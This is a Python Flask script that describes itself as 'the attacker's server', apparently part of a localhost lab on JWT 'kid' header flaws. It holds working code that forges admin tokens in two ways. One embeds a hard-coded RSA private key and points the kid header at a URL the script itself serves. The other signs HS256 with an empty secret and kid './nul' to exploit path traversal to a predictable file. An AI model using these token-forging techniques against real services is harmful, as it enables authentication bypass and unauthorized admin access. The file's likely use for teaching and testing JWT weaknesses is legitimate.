from flask import Flask
import jwt
import time

app = Flask(__name__)

PRIV_KEY = """-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCgvJGpwycUb5gG
VqOlk3PBUn68JXS6eS4aO0LpT84ICN/3M6gRbz6AnMXJc9qGt/I5FRaztxzywenW
qsKZf7O93nk7AksJJxIr+cdF44qxAPKSUn7bQb92oWTTWd9YaSXveB+fShH41M9E
UYBIG9Xi2s4f2LaS+wECpxaOcWUkNYHM2yxQYw+iOz/vqqKzjVUD/mTbzM6wZL2Y
pm2y/ud6beQN/LBmfQlEdDVFxnJ+9KBtEDlf6KfI4OGp/qrQfCxdTzLNq2HKGSOn
TZ9NLmOF7e4Y3xWbsDxV2+PZZYZhNEwMNnZARqVRORXxIFKV1GBWgzTQVEWmLflt
/Eh5nqw3AgMBAAECggEBAJehS8hZ0QP2QfO4x6fq8cftiqDytKs0pckZHoX6QuJR
fPY2RNYtm0i4m9zu7bcoz9gJjOD8XNKlG3Lmo60qSuVSegqwnxiDQyE5AENt4+gW
fL6MFB/CZlwC5Jp8rbU5fA/rwekCdvHFz8EjIWDk4WCgCNMCHTmKj+lwtlapokAE
uWhwY8E79FhptVRoOHOg5FinVBCZf2n+mu4a2FtrAa8kadoCUTnoydQF+qMAgE/+
y4bFNXgxCwvOCYDx++HJV7iQBKy50W1pm12mn8DAPfl4gahzePwB7qIrUtshA7J5
Wvg+72XrJtcT6gzN7cSzbCnTqWKzTty0JRQ5EH4McAECgYEA336/rIBmqX8wzkac
zMuzuW6HLypT9pTh8OFp/3FD0YRwimpauTeA2wUs87OOX8IhDW0rEGT52X2lbG0e
1GCiLLIC3Yq5ey1X1Pw6tCcaalJ3g5GgianZCw/42ySz9cT4Gf6ZflhSMaWC0iZV
4Ao/K4CRxZj6hgicxTgfKFXElacCgYEAuB0sJPkyPT2usYkhZKGEcK3MW5+HFqKs
pqJXszMkLKS9HTkuPfT4/Cxlq++F1wq+QmnUeuERPmgDt7F/YxNXYCAA0Qjp9Upb
gckDB1eAognlNet2lyS+XrSNvwGYypEd7b15Bx/DG2m/AWdx9NprIeYcBYRZixO/
1qCJwqDRJvECgYAmkcsmS+prqeWUU59PwH+9qpNt0lI3Ja5wUZZnXPalO8PoPz50
5F06bwQ48m3JnMjzdjmOVL7Bh+t6cMJ3SE30hKv167DizwpvWTAQUwc9/gleDU21
NDierhz2RLlB2sIuSj/XDArzQmr3NWJwjZQlP8ToYuQpKWdUqcDGxzZr1QKBgH8n
tqs6Z9Yf2ZzHhoaHfn6Lqc3FmXiqlO7oxAUBVwR2Kh4atbMYkzUmPHnIjPj9dHVN
ve+3rT8aeybMsZvtabT7pVS5AUvlNNmnyC2z4yUGDIV2v4qXV9r0e8jlA28zViYx
a3reFtPB7qa7mNpwVvksgUHWLDl/REioyzvd8VUhAoGBAIVNat229CwzyFG0wxdu
voqhK+3B97cHmsTr3dbMwDy+5fAL493rz6WDmVxE/qKGFT6AHXs+aX5Vytyhx3PF
Ly44XWRsMgBdaiyIRTkzAKct54ZPWGx4b04RB4yWqqQY8YyYFPHMcV7iYAc6P90r
AozE7SuHWAgBu2FL4eNa2MKU
-----END PRIVATE KEY-----"""

@app.route("/")
def main_page():
    return "This is the attacker's server.<br><br><a href=\"/gen-basic\">Generate an admin token with my own private key</a><br><a href='/gen-path-traversal'>Generate an admin token with a predictable key file</a>"

@app.route("/gen-basic")
def gen_token():
    token = jwt.encode({"admin": "true", "iat": int(time.time())}, PRIV_KEY, algorithm="RS256", headers={"kid": "http://localhost:5003/kid/priv.key"})
    return  "<h2>Attack by replacing KID with your own private key url</h2>Here you go:<br><br>{0}<br><br>Return to the <a href=\"/?token={0}\">main page</a><br><a href='http://localhost:5002/basic?token={0}'>Attack Server Page</a>".format(token)

@app.route("/gen-path-traversal")
def gen_token_pt():
    token = jwt.encode({"admin": "true", "iat": int(time.time())}, "", algorithm="HS256", headers={"kid": "./nul"})
    return  "<h2>Attack by replacing KID to a predictable file on server</h2>Here you go:<br><br>{0}<br><br>Return to the <a href=\"/?token={0}\">main page</a><br><a href='http://localhost:5002/path-traversal?token={0}'>Attack Server Page</a>".format(token)


@app.route("/kid/priv.key")
def priv_key():
    return PRIV_KEY

if __name__ == "__main__":
    app.run(port=5003)
